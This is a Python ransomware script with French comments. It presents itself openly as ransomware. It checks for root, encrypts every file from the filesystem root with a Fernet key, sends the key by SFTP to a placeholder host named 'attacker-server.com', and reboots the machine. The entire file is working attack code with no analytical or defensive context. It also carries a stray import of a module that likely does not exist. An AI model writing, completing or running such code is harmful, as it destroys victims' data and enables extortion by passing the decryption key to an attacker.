import os
import logging
import  fernet
from cryptography.fernet import Fernet
import paramiko
import sys
import time
import subprocess


# Fonction de génération de clé de chiffrement
def generate_key():
    key = Fernet.generate_key()
    return key


# Fonction de chiffrement des fichiers
def encrypt_file(file_path, key):
    try:
        f = Fernet(key)
        with open(file_path, 'rb') as file:
            file_data = file.read()

        encrypted_data = f.encrypt(file_data)

        with open(file_path, 'wb') as file:
            file.write(encrypted_data)

        logging.info(f"Fichier chiffré : {file_path}")

    except Exception as e:
        logging.error(f"Erreur de chiffrement du fichier {file_path}: {e}")


# Fonction pour parcourir le système et chiffrer les fichiers
def encrypt_system(root_dir, key):
    for root, dirs, files in os.walk(root_dir, topdown=True):
        for name in files:
            file_path = os.path.join(root, name)
            encrypt_file(file_path, key)


# Fonction pour transférer la clé via SFTP
def transfer_key_to_attacker(key, sftp_host, sftp_port, sftp_user, sftp_pass, remote_path):
    try:
        # Connexion SFTP
        transport = paramiko.Transport((sftp_host, sftp_port))
        transport.connect(username=sftp_user, password=sftp_pass)
        sftp = paramiko.SFTPClient.from_transport(transport)

        # Sauvegarder la clé dans un fichier temporaire
        temp_key_file = '/tmp/encryption_key.key'
        with open(temp_key_file, 'wb') as f:
            f.write(key)

        # Transfert de la clé
        sftp.put(temp_key_file, remote_path)
        logging.info(f"Clé transférée avec succès à {remote_path}")

        # Fermeture de la connexion SFTP
        sftp.close()
        transport.close()
        os.remove(temp_key_file)  # Suppression du fichier temporaire

    except Exception as e:
        logging.error(f"Erreur lors du transfert SFTP : {e}")


# Fonction pour redémarrer le système
def restart_system():
    try:
        logging.info("Redémarrage du système...")
        subprocess.run(['reboot'], check=True)
    except Exception as e:
        logging.error(f"Erreur lors du redémarrage du système : {e}")


# Fonction principale du ransomware
def run_ransomware():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

    # Vérification que le script est exécuté avec les privilèges root
    if os.geteuid() != 0:
        logging.error("Ce script doit être exécuté en tant que root.")
        sys.exit(1)

    # Génération de la clé de chiffrement
    key = generate_key()

    # Parcours du système pour chiffrer les fichiers
    logging.info("Début du chiffrement du système...")
    encrypt_system('/', key)

    # Paramètres SFTP pour l'exfiltration de la clé
    sftp_host = 'attacker-server.com'  # Adresse du serveur d'attaque
    sftp_port = 22  # Port SFTP
    sftp_user = 'attacker'  # Nom d'utilisateur SFTP
    sftp_pass = 'password'  # Mot de passe SFTP
    remote_path = '/remote/path/key.key'  # Chemin distant pour stocker la clé

    # Transfert de la clé via SFTP
    transfer_key_to_attacker(key, sftp_host, sftp_port, sftp_user, sftp_pass, remote_path)

    # Redémarrage de la machine
    restart_system()


# Lancer le ransomware
if __name__ == "__main__":
    run_ransomware()
